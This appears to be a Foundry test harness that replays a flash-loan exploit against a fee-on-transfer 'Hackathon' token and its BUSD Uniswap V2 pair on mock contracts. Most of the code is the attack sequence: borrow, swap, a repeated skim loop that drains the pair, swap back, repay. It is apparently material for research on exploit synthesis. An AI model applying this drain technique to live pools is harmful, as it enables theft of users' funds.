// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {Hackathon} from "./Hackathon.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract HackathonTestBase is Test, BlockLoader {
    BUSD busd;
    Hackathon hackathon;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address hackathonAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1713102233;
    uint112 reserve0pair = 20977616272338421765527051;
    uint112 reserve1pair = 21022463771179001068726;
    uint32 blockTimestampLastpair = 1713099253;
    uint256 kLastpair = 441000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplybusd = 3679997893719565019732285863;
    uint256 balanceOfbusdpair = 21022463771179001068726;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplyhackathon = 21000000000000000000000000;
    uint256 balanceOfhackathonpair = 20977616272338421765527051;
    uint256 balanceOfhackathonattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        hackathon = new Hackathon();
        hackathonAddr = address(hackathon);
        pair = new UniswapV2Pair(
            address(hackathon),
            address(busd),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        busd.transfer(address(pair), balanceOfbusdpair);
        hackathon.transfer(address(pair), balanceOfhackathonpair);
        uint256[] memory feeList = new uint256[](3);
        feeList[0] = 500;
        feeList[1] = 500;
        feeList[2] = 0;
        hackathon.prepare(address(pair), true, feeList);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(busd),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Hackathon Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(hackathon),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(hackathon),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(pair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(pair),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(attacker),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e12 + balanceOfbusdattacker;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_hackathon_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        hackathon.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_hackathon_owner(uint256 amount) internal eurus {
        hackathon.transfer(owner, amount);
    }

    function swap_pair_attacker_hackathon_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        hackathon.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_busd_hackathon(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_hackathon_pair(uint256 amount) internal eurus {
        hackathon.transfer(address(pair), amount);
        uint256 i = 0;
        while (i < 10) {
            pair.skim(address(pair));
            pair.skim(address(attacker));
            i++;
        }
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_busd_owner(2200 * 1e18);
        printBalance("After step0 ");
        swap_pair_attacker_busd_hackathon(
            busd.balanceOf(attacker),
            pair.getAmountOut(busd.balanceOf(attacker), address(busd))
        );
        printBalance("After step1 ");
        burn_hackathon_pair(hackathon.balanceOf(attacker));
        printBalance("After step2 ");
        swap_pair_attacker_hackathon_busd(
            hackathon.balanceOf(attacker),
            pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
        );
        printBalance("After step3 ");
        payback_busd_owner((2200 * 1e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        payback_busd_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
